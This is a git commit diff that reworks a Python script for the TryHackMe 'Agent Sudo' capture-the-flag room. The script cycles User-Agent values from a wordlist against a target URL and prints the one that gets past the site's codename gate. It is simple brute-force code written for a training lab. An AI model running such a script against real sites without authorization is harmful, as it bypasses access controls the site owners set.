5ce4aae05286204929de5facf3fa08ca90a2d90d
RAHUL DIXIT (syncattacker) <cybereyerahul@gmail.com>
2025-04-16 18:52:00 -0400

    Agent Sudo Python Script Update

--- THM/Agent-Sudo/user-agent-attack.py
+++ THM/Agent-Sudo/user-agent-attack.py
@@ -1,21 +1,42 @@
 #!/usr/bin/python
 
 import requests
+import argparse
+from colorama import Fore, Style
+
+
+parser = argparse.ArgumentParser(description = "User-Agent brute force script for agent-sudo challenge on TryHackMe.")
+parser.add_argument("--wordlist", required = True, help = "Path to the wordlist to be used in place value of User-Agent Header")
+parser.add_argument("--url", required = True, help = "Specify the target URL, Victim IP or URL (http://<IP>)")
+arguments = parser.parse_args()
 
 matcher = b'\n<!DocType html>\n<html>\n<head>\n\t<title>Annoucement</title>\n</head>\n\n<body>\n<p>\n\tDear agents,\n\t<br><br>\n\tUse your own <b>codename</b> as user-agent to access the site.\n\t<br><br>\n\tFrom,<br>\n\tAgent R\n</p>\n</body>\n</html>\n'
 
+def bruteForce(wordlist, url, matcher):
 
-header = { 'User-Agent' : '' }
+	header = {
+		'User-Agent' : ''
+	}
 
-fuzzwords = open("user-agent-fuzz.txt", "r")
-agents = fuzzwords.readlines()
+	print(Fore.RED + f"[+] Starting User-Agent Brute Force on {url}")
 
-for agent in agents:
-	header['User-Agent'] = agent.strip("\n")
-	response = requests.get("http://10.10.181.226", headers = header)
-	if response.status_code == 200 and response.content == matcher:
-		print("Blocked Response!")
-	else:
-		print(header['User-Agent'])
-		print(response.text)
+	with open(wordlist, "r") as possibleUserAgents:
+		agents = possibleUserAgents.readlines()
+	
+	for agent in agents:
+		header['User-Agent'] = agent.strip("\n")
+		response = requests.get(url, headers = header)
+		if response.status_code == 200 and response.content == matcher:
+			print(Fore.RED + f"[-] Incorrect User-Agent : {header['User-Agent']}")
+		else:
+			print(Fore.GREEN + f"[+] Success User-Agent : {header['User-Agent']}")
+			print(Fore.GREEN + f"[*] Content \n{response.text}")
+			break
+
+	print(Style.RESET_ALL + "Credits @syncattacker (https://github.com/syncattacker)")
+
+
+bruteForce(arguments.wordlist, arguments.url, matcher)
+
+
 
